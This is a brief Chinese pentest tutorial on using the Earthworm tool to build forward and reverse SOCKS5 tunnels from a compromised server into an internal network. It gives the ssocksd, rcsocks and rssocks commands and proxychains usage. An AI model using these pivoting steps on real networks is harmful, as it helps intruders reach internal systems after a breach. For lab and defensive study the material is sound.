# Earthworm (EW) 做Socks5正向和反向代理穿透内网

  

## 一、Earthworm (EW)简介

  

EW是一套便捷的网络穿透工具

  

工具支持多个平台，穿透模式分为正向代理和反向代理

  

该工具已经停止更新了，并且杀软都会报毒

  

## 二、EW使用

  

#### 网络拓扑图

![](../Images/5a00b6e0424c30c707b702cb9463b8b4.png "image-20210519230810330.png")

#### 正向代理

  

假设拿下B服务器，将工具上传到B服务器上使用

  

跳板机执行命令

  

```
ew\_for\_Win.exe \-s ssocksd \-l 8888
```

![](../Images/71072f5fd10f80818929dbf55ad82d31.png "image-20210519230830682.png")攻击机开立开启代理

  

```
vim
 /etc/proxychains.conf//这里填写的IP是跳板机的IP地址和跳板机上设置的端口
```

![](../Images/4ec37d928befbaed0c7a13ea9667f9e5.png "image-20210519231052643.png")

成功访问内网机器的80端口

  

```
proxychains curl http://10.10.10.132:80
```

![](../Images/c3de047e2c0265a7b9a15e43220f483a.png "image-20210519231249274.png")

#### 反向代理

先在B机器上执行命令

```
ew\_for\_Win.exe \-s rcsocks \-l 7766 \-e 6677
//跳板机监听7766端口并把流量走6677端口
```

![](../Images/a54a685d6088965ec084ebc163f315e7.png "image-20210519233222584.png")

再在C机器上执行命令

```
ew\_for\_Win.exe \-s rssocks \-d 10.10.10.133 \-e 6677
//内网机器连接10.10.10.133的6677端口
```

![](../Images/daae96b1eb0caa5a7273a2a24562882f.png "image-20210519233323159.png")

攻击机开启代理

```
vim
 /etc/proxychains.conf//本地机器做代理，流量走跳板机的7766端口，就可以访问到C内网
```

![](../Images/506df88dadc2ebc7f10d03fd2c4c7541.png "image-20210519233148493.png")
